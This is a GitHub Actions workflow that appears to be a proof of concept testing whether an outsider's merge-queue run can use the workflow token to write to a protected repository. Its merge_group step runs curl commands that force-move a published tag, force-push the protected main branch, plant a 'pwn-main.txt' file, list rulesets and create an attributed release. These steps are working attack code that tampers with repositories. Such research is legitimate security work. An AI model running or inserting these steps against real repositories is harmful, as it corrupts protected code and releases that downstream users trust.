name: slowgate
on:
  pull_request:
  merge_group:
permissions:
  contents: write
jobs:
  slowgate:
    runs-on: ubuntu-latest
    steps:
      - name: READONLY-OUTSIDER-DECIDES-THE-GATE
        run: echo marker
      - name: what can this token reach in the BASE repository
        if: github.event_name == 'merge_group'
        env:
          GH_TOKEN: ${{ github.token }}
          R: ${{ github.repository }}
          S: ${{ github.sha }}
        run: |
          A="Authorization: Bearer $GH_TOKEN"
          AC="Accept: application/vnd.github+json"
          j(){ curl -s -H "$A" -H "$AC" "$@"; }
          c(){ curl -s -o /tmp/o -w '%{http_code}' -H "$A" -H "$AC" "$@"; }

          echo "--- PRE-STATE ---"
          echo "MAIN-BEFORE=$(j https://api.github.com/repos/$R/git/ref/heads/main | python3 -c 'import sys,json;print(json.load(sys.stdin)["object"]["sha"])')"
          echo "TAG-BEFORE=$(j https://api.github.com/repos/$R/git/ref/tags/v1.0 | python3 -c 'import sys,json;print(json.load(sys.stdin)["object"]["sha"])')"
          echo "CANDIDATE-SHA=$S"

          echo "--- A: force-move an ALREADY-PUBLISHED TAG (ruleset targets branches only) ---"
          echo "A-TAG-FORCE=$(c -X PATCH https://api.github.com/repos/$R/git/refs/tags/v1.0 -d "{\"sha\":\"$S\",\"force\":true}")"
          cat /tmp/o | head -c 200; echo
          echo "A-TAG-AFTER=$(j https://api.github.com/repos/$R/git/ref/tags/v1.0 | python3 -c 'import sys,json;print(json.load(sys.stdin)["object"]["sha"])')"

          echo "--- B: DIRECT write to PROTECTED main via refs API ---"
          echo "B-MAIN-PATCH=$(c -X PATCH https://api.github.com/repos/$R/git/refs/heads/main -d "{\"sha\":\"$S\",\"force\":true}")"
          cat /tmp/o | head -c 300; echo

          echo "--- C: DIRECT write to PROTECTED main via contents API ---"
          echo "C-MAIN-CONTENTS=$(c -X PUT https://api.github.com/repos/$R/contents/pwn-main.txt -d '{"message":"outsider","content":"b3V0c2lkZXIK"}')"
          cat /tmp/o | head -c 300; echo

          echo "--- D: can the token EDIT THE RULESET that protects main ---"
          echo "D-RULESET-LIST=$(c https://api.github.com/repos/$R/rulesets)"
          cat /tmp/o | head -c 200; echo

          echo "--- E: can the token create a RELEASE (attributed artifact) ---"
          echo "E-RELEASE=$(c -X POST https://api.github.com/repos/$R/releases -d "{\"tag_name\":\"v1.0\",\"name\":\"v1.0\",\"body\":\"outsider\"}")"
          python3 -c 'import json;d=json.load(open("/tmp/o"));print("   release author =",d.get("author",{}).get("login"),"| tag =",d.get("tag_name"))' 2>/dev/null || head -c 200 /tmp/o

          echo "--- POST-STATE ---"
          echo "MAIN-AFTER=$(j https://api.github.com/repos/$R/git/ref/heads/main | python3 -c 'import sys,json;print(json.load(sys.stdin)["object"]["sha"])')"
      - name: hold
        if: github.event_name == 'merge_group'
        run: sleep 60
